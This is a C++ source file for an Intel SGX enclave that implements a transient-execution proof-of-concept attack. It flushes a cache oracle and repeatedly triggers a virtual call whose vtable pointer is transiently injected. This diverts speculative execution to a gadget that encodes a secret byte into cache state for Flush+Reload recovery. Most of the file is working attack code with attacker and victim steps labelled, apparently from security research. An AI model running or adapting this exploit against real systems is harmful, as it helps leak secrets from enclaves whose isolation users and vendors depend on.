/*
 * Copyright (C) 2011-2017 Intel Corporation. All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 *   * Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *   * Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in
 *     the documentation and/or other materials provided with the
 *     distribution.
 *   * Neither the name of Intel Corporation nor the names of its
 *     contributors may be used to endorse or promote products derived
 *     from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
 * SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
 * LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */


#include <stdarg.h>
#include <stdio.h>      /* vsnprintf */

#include "Enclave.h"
#include "Enclave_t.h"  /* print_string */
#include "sgx_trts.h"
#include "../conf.h"

char *oracle;

//non-assembly access that doesn't get optimized away by -O3
static inline void maccess(void *p) {
  asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax");
}

static void flush(void *p) {
#ifdef GS
  asm volatile("clflush %%gs:0(%0)\n" : : "c"(p) : "rax");
#else
  asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax");
#endif
}

void oraculate(void *this_, char *oracle, uint8_t leak)
{
  *((volatile uint64_t *)(oracle + 4096*leak));
}

/* 
 * printf: 
 *   Invokes OCALL to display the enclave buffer to the terminal.
 */
void printf(const char *fmt, ...)
{
    char buf[BUFSIZ] = {'\0'};
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, BUFSIZ, fmt, ap);
    va_end(ap);
    ocall_print_string(buf);
}

uint64_t __attribute__((aligned(0x1000))) enclave_page[4096] = {3,2,1};

class B
{
public:
  int dummy = 0xdeadbeef;
  virtual void bar(char *oracle, uint8_t leak) {};
  virtual ~B(){};
};

class C : public B
{
public:
  void bar(char *oracle, uint8_t leak) override;
  ~C(){};
};


volatile int a = 0;

void C::bar(char *oracle, uint8_t leak)
{
  a++;
}


B* b = new C();


void ecall_run_attack(void* oracle_) {
  oracle = (char *)oracle_;

  printf("inside oracle at %p\n", (void *)oracle);

  int i;
  for (i = 0; i < 256; i++)
  {
    flush(oracle + i * 4096);
  }

  unsigned count = 0;

  void *delay[9] = {0};

  while(count < 100001)
  {
    count++;
  
    //attacker prep, clears accessed and flushes variables
    //this could happen in a parallel thread or an sgx-step interrupt
    ocall_modify_page((void*)b);

    maccess(0);

    flush(&delay[0]);
    //flush(&delay[8]);

    //victim
    //needs at least one delay like for good leakage
    //if the leakage rate is low, try more
    maccess(&delay[0]);
    //maccess(&delay[8]);

    //0 gets transiently injected into the load of b here, placing the vtable at page 0
    //this calls the function "oraculate" instead
    b->bar(oracle, LEAKAGE_CHAR);

    //attacker processing
    //this could happen in a parallel thread or an sgx-step interrupt
    ocall_check_oracle(nullptr);
        
  }

}

void* ecall_get_function(void) {
  printf("inside address of oraculate: %p\n", &oraculate);
  return (void *)(&oraculate);
}
